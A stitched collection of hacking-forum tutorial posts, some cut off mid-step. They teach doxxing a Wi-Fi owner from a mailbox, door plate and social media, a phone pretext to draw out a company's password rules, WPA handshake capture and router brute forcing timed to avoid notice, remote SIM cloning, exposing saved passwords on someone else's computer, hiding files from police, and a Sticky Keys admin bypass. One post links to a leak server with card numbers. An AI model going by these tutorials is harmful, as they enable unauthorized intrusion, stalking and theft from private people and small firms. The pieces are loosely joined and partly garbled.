Creating dictionaries based on information from OSINT - Tutorial part 2,Drive by compromise,,,https://hackforums.net/showthread.php?tid=6068455,"Returning to the starting point. What if the network turns out to be a private network? At first it may seem that reconnaissance in this case is pointless but this is a very wrong assumption. In fact, in this situation, we can consider two probable cases: either the owner changed the default password or did not. In the latter case, the matter is much easier because it is enough to check the router model (look at the ssid network. I am sure that if a person has not changed the ssid network, then the default password has not been changed. Now just ""Google"" this equipment to learn the rules creating passwords by the producer (I wrote about it in another tutorial). But let's consider an example where the ssid and password were changed. How can we narrow down the space for potential passwords ?. First of all, I would try to determine who exactly this network belongs to (this is a specific person). The easiest way will be to visit the place (its location is determined using Wigle) then we can based on information from mailboxes (or intercoms if we have to deal with a block of flats, in which case we will also need a phone application capable of analyzing the strength of the wifi signal ( e.g. Wifi Analyzer) and based on the signal strength, we are able to determine the apartment from which the network comes from. Now just look at the name plate on the front door to find out the personal details of the owner). If, however, it turned out that it is impossible to determine the data in this way, we can use the so-called ""subscriber lists"" available on the internet (this is a digital telephone directory). Just enter the desired address there and thanks to that we will get to know the data of the person living at the given address (provided that such a person has agreed to enter it in such a book early and I am honest to say that in my country it is rare that people do not agree to it). For the purposes of our example, however, let us recognize that we have learned the name of the owner. The next step to take would be to check the social media of such a person (facebook, twitter and thousands of other portals) to determine their interests, workplace, hobbies, pages and things he likes, posts he publishes, etc. Any such information is invaluable. Why? Because each of them can be a potential password. People are very lazy beings by nature and strive for ""simplifications"" in every possible situation and thus become very predictable. There is only a percentage of people who follow the basic safety rules, e.g. when creating secure passwords, all the rest is based on simplifications, patterns that are easy to remember (e.g., cat's name + current year or your favorite football team + your child's date of birth). In many, many cases such people nunknowingly publish ""hints"" to their passwords in posts on social networks (let's assume that someone posts a lot about their favorite football team, try to match the team name or name of the top player of this team with the current year. I guarantee you that at 65% it will be the password to his email inbox, wifi or other service. Variations of this pattern may be different, experiment, you'll see it works: D) Based on the information we have, we are able to generate a dictionary modified with specific patterns (such as current year, members' birth dates) families, names of favorite things, etc.) There are really many such examples and all in this field you are limited only by your own imagination and set of information. Of course, I would be ignorant if I said that it is a reliable method, it can always happen that it will not be possible to obtain a password in this way because, for example: the password will be randomly generated and will not be associated with any information shared by the owner of the network. However, I think that this technique is very effective and not only when cracking passwords (repeatedly finding a credit card I was able to set a pin to it within 15 minutes (you do not even realize how many people set the date of birth as a pin) and I have often called shock and disbelief on the owner's face. All in all it is an effective way to pick up XD). It is also worth mentioning here another important thing which is checking for password leaks from various websites. There are many different services such as haveibeenpwned.com where you just need to tap the email address and we can easily find out if the password for the email has leaked. With such a password, we are able to generate thousands of other passwords based on it, which may prove effective in our attack. And that would be enough when it comes to generating dictionaries. I am aware that what he describes is an iceberg tower and one could write a lot about it, but the assumption was about the basics. Below are links to pages that can be useful when creating dictionaries: WEBSITES WITH DATABASE LEAKS: - haveibeenpwned.com - Vigilante.pw - https://down.tencent.pp.ua - this server contains several hundred GB of various database leaks, personal data, credit card numbers from various services such as Amazon, Xaomi, Gmail as well as many Asian services. However, I warn you against downloading any software, scripts or similar stuff from there. This site does not belong to me and I am not responsible for the software there (I downloaded several GB of various leaks from it myself and they are cool but as I said before, do not download anything else from there !!!

Creating dictionaries based on information from OSINT - Tutorial part 1,"Drive by compromise,Input Capture",,,https://hackforums.net/showthread.php?tid=6068453,"I decided to write a small guide on creating effective and personalized dictionaries for cracking passwords based on data from ""white intelligence"" and knowledge about human nature (called social engineering;)) I think that creating dictionaries is crucial for the effectiveness of password cracking attacks and many people approach this topic with incorrect assumptions, which directly translates into their effectiveness in action. Based on the examples, I will try to show the basic assumptions in creating such lists that, in my opinion, increase our chances and save a lot of time during work. Although this guide will be very theoretical, I will try to put here links to sources / pages that in my opinion may be useful. As usual, if I made a mistake, let me know;) and now we are flying with it. As I mentioned earlier, generating effective (not effective :)) dictionaries is crucial for success in the process of breaking passwords. But just having a huge dictionary containing all possible combinations of characters does not provide us with efficiency when breaking a password (an attempt to crack a well-chosen and complex password is quite strongly limited by the capabilities of our equipment and if we do not have a super-computer on our services, such a password cracking can really take a lot of time and sometimes it will be unreachable even if the huge dictionary will contain the password we are looking for). It is known that in the internet age we can use specially dedicated online services for cracking passwords (which I use with the rest), but they sometimes fail even though in many cases their effectiveness is quite good. However, I have convinced myself that a well-constructed dictionary will be ten times better than many powerful online services. I will compare it to a shot from a sniper rifle and a shot from a children's slingshot, we know what is more laughable: P To better illustrate this, I will use the first better from the edge example. You want to hack into a wifi router, at the very beginning you only know the ssid network. You are intercepting a handshake and trying to crack a password. You start aircrack (or hashcat, it all depends on which program you prefer) in combination with several different dictionaries (let's say you used the dictionary with default passwords in succession, then you started the numeric dictionary (from 8-15 digits) and at the end you used a password built of leaked to the internet) but unfortunately you didn't break it. What will you do next? do you launch a dictionary with all possible password combinations? How long will it take you to crack a password with this technique? And this is where white intelligence techniques come to the rescue. Thanks to the reconnaissance we are able to get some information about our goal and try to narrow down the area of ​​our search in terms of a potential password. Returning to our example, instead of senselessly and laboriously breaking the password by the method of brute force, it would be better, for example, to check the geolocation of our network using Wigle (internet map of wifi network) and find out whether the network we are dealing with belongs to a company or rather a private person (if the network is located in a large block of flats, we can certainly assume that it is a private network, and companies are trying to ""mark"" their headquarters in services such as google to help potential customers reach them, so quick patting the coordinates to google maps will dispel your doubts: D). If it turned out that I have to deal with the company, the first place I would go is the company's website, which many times turns out to be a treasury of knowledge about its employees. Secondly, I would visit the social media of the goal itself, but also of their employees (and here I point out that for me the most ""valuable"" employees are, of course, those from the IT department. For known purposes, errors made on their part are critical and many times it happens that it is on their part, the easiest way to get information is It is quite often that small businesses simply cannot afford to hire a company specializing in Internet services security that could watch over the security of the company 24/7 so they burden their technical employees to such an extent that it is very easy to make a mistake. I have often been a world of situations in which when searching Google Groups I came across otware of a group of employees of a company where they exchanged information about security or put on them various sensitive information from the point of business. You probably wonder what exactly it has is the connection with the creation of dictionaries? Hold on for a while and I'll give you a concrete example of how I would use it). After obtaining basic information such as names and telephone numbers of employees, working hours, distribution of departments in the company and the like I could try to learn a bit about politics of company passwords (if it exists at all, sometimes it happens). Let social engineering help us again :) it would look something like this: I would call an IT employee on Friday at 14.45 (Sounds strange but think about it so that everyone is tired after a hard week of work and when people realize that in a few minutes they end their heavy drudgery, many of them ""turn off"" logical thinking while enjoying the upcoming weekend) claiming to be an employee of one of the departments and pretending to be a completely ""unknowing guest"" I would sell him such a story ""Here NAME SURNAME from such and such department. I have very serious problem. Yesterday someone broke into my private computer and stole all my bank passwords, data from various websites etc. The worst thing is that I had the same password everywhere. I reported it and told the police to change all my passwords. to do on my company computer but one of my colleagues from my department told me to at the beginning he contacted you because our company has some rules regarding passwords. Could you help me and tell me how to create the correct password? ""I know that now people who are familiar with the topic will speak and say that nowadays administrators will not be fooled by this type of number just because they can change passwords"" remotely ""for all domain users. Yes it is true and in such a case such an attack will prove to be ineffective. But believe me or not that many small companies in Poland (in which I live ^^) can be caught. I used this attack several times myself and I received information about the complexity of passwords, which was enough to generate the right dictionary and reduce the time needed to complete the task. As you can see, a set of several seemingly innocent information combined with a good ""played"" phone (social engineering attack) acts like a deadly sniper shot: P I am aware of the fact that the examples I use are trivial ale it seems to me that they clearly show the value of reconnaissance and that every time spent on white intelligence will double pay."
[OP8] [TUT | Security] Basics of a Honeypot,Masquerading,,,https://hackforums.net/showthread.php?tid=6068367,"Honeypots are decoy systems (intended to look like legitimate, openly vulnerable systems to attract attackers or hackers) working alongside actual production systems on a server or network. These are to lure attackers into thinking that they are actual targets and add to various security monitoring opportunities for hackers and misdirect them from their actual target. These are designed depending on one's needs and is a significant line of defense in mitigating attacks early. Some are as advanced as being capable of detecting attacks or deflecting them away from a legitimate target. They can also be used to gain information about the source of attacks (usernames, passwords, IP addresses). A Simple Principle You come prepared for attackers. The idea is to prepare something that would attract their interest, the honeypot. Then wait for the attacker to show up. Types of Honeypot Tech: Malware based: Also known as replication tech. These are designed to emulate as storage devices. Commonly used tech such as Ghost Project. When the malware tries to infect your machine, the Honeypot will trick the malware into infecting the emulated USB Device instead. Spam Countermeasure based: These are often used to emulate open mail relays and open proxies. When Spammers test the open mail relays by sending themselves an email first, if they succeed, they then send out large quantities of spam. This type of honeypot can detect and recognize this test and successfully block the massive volume of spam that follows. Database honeypot: Attacks such as SQL injections often goes undetected by firewalls. So by using a database firewall, which can provide honeypot support to create decoy databases and infect them instead of the main database will keep your website safe. A good example of this is the MyBB AdminCP Honeypot. Honeynets: Rather than being a honeypot in itself, it's a network that has a cluster of pots."

But of course, to actually attack a computer, you must have some form of connection to it. One of the obvious mediums of connectivity is a wireless network. By cracking into a network, you can then sniff the network, steal bandwidth, use their IP address to browse anonymously, and perform exploits against computers on that network with ease. This tutorial will cover cracking the most basic common form of wireless encription: WEP WEP stands for Wired Equivalent Privacy, and this form of encryption is relativity weak, so can be cracked with some speed. It has been replaced by modern networks by WPA and WPA2 encryption, which i will cover in subsequent tutorials, but WEP is still surprisingly common, so it is a worthy subject for the beginning tutorial in my series. Cracking a WEP encryption basically works on the principle of capturing packets of data sent on the network, and using them to decode the encryption key. We will be using Aircrack-NG to crack the encryption in this tutorial, which is my favorite program for cracking wireless networks. 1) Find your wireless adapters name This is simple, just open a terminal and use this command to find your wireless adapters identifier:"

This may, or may not work, but this is one of the most basic methods and I'd say the starting point of trying to Dox someone. 1) It harder to locate if all you have is an alias or a username. However, Google search, or websites such as http://pipl.com are your best friends. - The point of these is to try and find any details attached to their username, this may be their first name, an email address a website URL that they own or whatever.. Be sure to write down any information, no matter how big or small it may seem in a document. 2) If you've come across a website they own, a good place to start is Domain WHOIS. I either tend to use Godaddy WHOIS or: https://domainbigdata.com/ - Visit their website if no results are returned, see what contact information they have on their, if any social media pages - see if they're linked with a phone number or email address, or even a location. 3) If that didn't come back with any results, then give a shot it a shot with http://pipl.com - Try enter any usernames, or emails you've found to try and find enough information to come back with their social media pages. 4) Once you have enough information, you can use services such as White Pages if you're based in the US, or 192.com if you're based in the UK to run their name and try to find out their address. This was a very simple, basic tutorial. There's 1000s of others way out there, but this is a good place to begin to get started. Several of databases that'll be holding valuable information which would help you trace back a person, whether that's an IP address, email, website or even a username on a forum.

[TUT] One method to Remotely Clone a SIM card (For Educational Purposes Only),"Exploitation of Remote Services,Drive by Compromise",,Author,https://hackforums.net/showthread.php?tid=6064905,"Premise: SIM cards are, allways have been, and probably will be quite vulnerable to remote hacking. Step 0 (Optional): Build your own Base Station Requirements: - (bladeRF x40 or any other full-duplex SDR capable of tuning between 300MHz and 3.8GHz band) - Two Quad-band Cellular Duck Antennas SMA - At least a Raspberry Pi 3 or better - Yate and YateBTS installed (ybts.conf and subscribers.conf files properly configured) you can also opt for any other equivalent base station s/w. Step 1: Cracking OTA keys Send a binary SMS to target device (use any signature). The SIM reject the randomly signed OTA command, but in many cases returns an error response with an error code carrying a cryptographic signature. Four algorithms are used for this signature: DES: most commonly used. (crackable) 3DES: sometime used. (usually fairly crackable unless 112/168 bit keys are being used) AES: rarely used. (bad luck) RSA: heard about its use but never seen it in use. (bad luck) You have three options to crack the signature and obtain a 56-bit DES key (3DES same as DES, it requires one or two more iterations for 2-key 3DES and 3-key 3DES): Option 1: Being patient and bruteforce it on GPU. (6 months with 100% success rate) Option 2: Throw money at it and bruteforce it on FPGA cluster. (1 day with 100% succes rate) Option 3: Use a 1.6TB Rainbow Table. (1-2 min with success rate < 100%) Step 2: Deploying the SIM malware The cracked DES key allows a properly signed binary SMS to be sent, which in turn downloads a malicious Java applets onto the SIM. The Java applet must properly employ the correct technique to break out of its realm and access the SIM protected functions (e.g. via a memory boundary violation attempt). The applet returns the Ki and IMSI via sms (IMSI can also be obrained after starting the base station at the end of step 0). Step 3: Cloning the SIM using Ki and IMSI Once Ki and IMSI are known you can follow any tutorial for local SIM cloning and you're set, you don't even need to crack the simcard to obtain the Ki since you alredy remotely obtained it."

Usually, the first thing I do when I can log in to such a network is a simple nmap scan to discover all the hosts on the network. The command looks something like this: ""nmap -sTV -p- NETWORK ADDRESS"" (usually 192.168.0.0/24 it all depends on the range of private addresses in your country😁️) ""STV"" means TCP scanning with software version detection. However, remember that the administrator may have intentionally changed the banners of running services to other completely unrelated to the service only to mislead the potential attacker. The ""-p-"" parameter means scanning all ports. Once I discover all the hosts, I try to scan them a bit more thoroughly using NSE (Nmap Script Engine). Which script I use depends strongly on the result of the first scan, services running on the given host, so I will not give an example of a specific script here. If you would like to see what nmap scripts have inbuilt, use the ""locate * .nse"" command. And if you want to scan your host with all the default nmap scripts, the command should look something like this: ""nmap -sC -p- HOST OR NETWORK ADDRESS"" I leave the collected results for later analysis. The next logical step is to check whether the administrator has changed the default login details for the router management panel. Having access to the above panel, I am able to obtain information such as: IP address of the router's external interface, telephone number (if it is a mobile router), information on ISP, information on the operating time of the device, its logs, connected users, etc. Additionally, I have the option I am able to successfully carry out attacks on users of this network by changing the configuration of a given router. So go to the browser and enter the router address there (you can easily check it by the ifconfig command, the gateway address is the router's address). When the administrator has not changed the data, I have a hand in action, if he has changed, we can try to forcefully crack the password using the thc-hydra program. I immediately point out that using it in a small network (and other than just a small one) can work like a DOS attack (because hydra during the attack floods the router with successive pairs of logins and passwords preventing users from accessing the router and thus network resources. Therefore, use this program treat as a last resort, such an attack is easy to detect, so be careful and use it best when there are no users in the network or late at night 😏️). To use the hydra program, we will need lists of usernames and potential passwords. The command itself looks like this:"

We will use the following command: Code airodump-ng INTERFACE NAME At this stage, it is worth noting some information that we will need in further work. They are min. BSSID and ESSID of the victim's network, the channel on which this network works, the type of encryption and MAC addresses of clients connected to the attacked AP (Access Point). Having the above information, we can also determine a few facts, these are: - Geographic location of a given wifi network (Wigle site is very helpful, just tap ESSID there and it's ready) - The name of the manufacturer of the given wireless router (MACVendors.com website and similar pages. This is very useful when the owner ESSID changes the network. We enter the BSSID of the network there and thanks to this we can get information about the manufacturer of the equipment. Then just use google to orientate in the password policy of the manufacturer and the default security configuration of the hardware.) - Did the owner change the default configuration of the equipment or not? (Consider the case in which we want to break into the network whose ESSID is the model of the router. Since the owner did not bother changing ESSID, we can safely assume that he also did not change the default password which consists of the same digits and the password itself is 8-13 characters long (this is a known problem of mobile routers.) I have encountered the situation many times when I broke the security of a given network and it turned out that the owner of NOT ONCE did not log in to the router management page. prompted to change the default password (this is where the above dictionaries we generated came from). - Is the given network intended for private / corporate use?

Once we have established some facts, then WE DISCONNECT WITH OUR HOME WIFI / NETWORK CONNECTION! Why is this so important? why do it Let the story from the beginning of my hacking adventure speak for itself. My friend and I broke into a network. We are poking around there as if nothing but, we have not appreciated the administrator of this network. After discovering the hack, he scanned our host and discovered the vulnerability of the FTP server running on this host (yes, I know an amateur in our implementation😆️) after taking over our machine the first thing the administrator did was ... he checked what networks this machine is connected to (in our case it was it's a friend's home wifi), as you probably already guessed, he patted the ESSID of this network to Wigle and got to know our location approximately 5 meters. Therefore, please learn from my mistakes and disconnect from your Internet just before proceeding just in case Once we have checked the above steps, let's try to capture the handshake of the given network. We will use the following command: Code airodump-ng -c CHANNEL NUMBER --bssid NETWORK BSSID -w WRITE FILE NAME HANDSHAKE INTERFACE After typing this command, several files with different extensions should appear in your home directory. This is where the handshake will be saved. In our case, we will only use the one with the ""cap"" extension. Others can be used in other programs for password cracking / packet analysis. In this moment, we can wait for one of the authorized clients to connect to the network and intercept his handshake or we can force the already connected client to disconnect. To do this, use the command:"

How to viewsaved passwords [2 steps],"Credentials from Password Stores,Drive by Compromise",,Author,https://hackforums.net/showthread.php?tid=6064153,"This is suitable for someone who has forgotten their password, but has it saved within the browser. It also works if you're using or on someone else's computer, and need to grab a password (for them, obviously) despite it being auto-filled. This method works best on Google Chrome. Step 1: Head over to website, and highlight the text box with the password, and then click on 'Inspect' (Inspect Element). Step 2: Find the code that says: Code ""type=password"" and replace it with: Code ""type=text"" Once you hit the enter button, it should reveal the password which was saved within the browser. This works on all websites on which the auto password fill feature is enabled. I hope this helps you retrieve, obtain or recover passwords."

[VERACRYPT] (FDE) Fully encrypt External HDD / Hidden Partition (2K20) [EVADE L.E.A],"Data encoding,Data obfuscation",,Author,https://hackforums.net/showthread.php?tid=6063995,"This tutorial will show you how to fully encrypt an external drive, specifically with a hidden volume. This process will be carried out by Veracrypt which can be found for download here. A hidden volume works when a main volume is encrypted, but contains another volume inside of it, hidden in junk data. A hidden volume will contain two headers, one for the outer/dummy partition, and one for the inner/hidden partition. There are many benefits of using encrypted drives. One for basic privacy. If you house files on a USB or external HDD and you lose it (its easy to do, belive me) anyone could plug it in and snoop through your information. Encryption will make sure those files don't get into the wrong hands. Also, this works nicely in criminal investigations. Anyone who specializes in Digital Forensics can tell if a drive is encrypted. Hidden volumes in a drive work nicely in a court of law. You get caught doing something you weren't supposed to, you get taken to court, and you will be charged with obstruction (and most likely hit with the proceeding charges anyway) if you don't unlock the device. The dummy partition is used to store bogus files. Things that look innocent. Songs, family pictures, games, pornography, videos, whatever. The real 'hidden' volume is the drive containing all the spooky 1337 haX0r files. There is no way to tell if a drive contains a hidden partition by simply looking at it, virtually of course. So far this stands as a full-proof technology. So without further ado, let's begin... Spoiler (Click to View) So there you go! You're all set. To access this drive, you open Veracrypt, click a random drive letter from the queue, then click the MOUNT button. A prompt will come up. To access the outer volume, enter in the outer volume passwords. The same logic applies for accessing the hidden volume. Cheers! PS: I mentioned at the beginning of this thread that there is no way anyone would be able to truly know if you have a hidden volume. This is true...however, due to the nature of most operating systems, especially Windows OS, they hold data and leave traces. Certain Windows OS components like prefetch cache, icon cache, thumbs DB, shells bags, and windows event logs can severely work against you and let an oversight know that you've been accessing files from certain other components. I will be dropping a thread on anti-forensics and evasion soon, however it would behoove you to do independent research on these topics to better secure yourself."

|USB LIVE BOOT| Gain Local Admin on ANY Windows Workstation |SHORTCUT EXPLOITS|,"Exploitation for Privilege Escalation,Abuse Elevation Control Mechanism",,Author,https://hackforums.net/showthread.php?tid=6063801,"In this tutorial you will learn how to gain local administrator access to any Windows machine via a shortcut exploit of either Window's StickyKeys or the Utility Manager. This is a well-known and still unpatched exploit to Windows systems that will guarantee easy admin access. Lets begin! To kick off this process you will need to be able to 'Live Boot' any Linux distribution of your choice off of a USB. Live Booting is essentially where you have an operating system installed to a USB which boots directly from memory. For all intensive purposes, Kali Linux will be used in this tutorial. If you already know how to setup a Live USB then you can skip this step. To begin you will need a USB, typically no smaller in size than 4 gigabytes. This process will automatically format your USB so make sure any important files you want to keep are backed-up elsewhere. When you have your USB ready you will need the image file of the distribution of Linux you are trying to run. As previously stated, Kali Linux will be used. If you are planning to use the same, the image file can be downloaded here. Be sure to choose the Live version opposed to the installer. You will also need to choose the correct architecture that matches your system, either x32 or x64 bit. When the image file has completed its download, you will need an image writer that will setup your Live USB. Feel free to use whichever writer you want. Win32 Disk Imager will be used in this tutorial. You will want to select the USB drive letter to write your image to as well as your image itself. If you're using Win32 Disk Imager, it file filter is set to .img Image file types. You will have to choose the *.* all-files option if your image was distributed as a .DD or .ISO disk image. When you're ready, write the image to the drive. It should look something like this:"
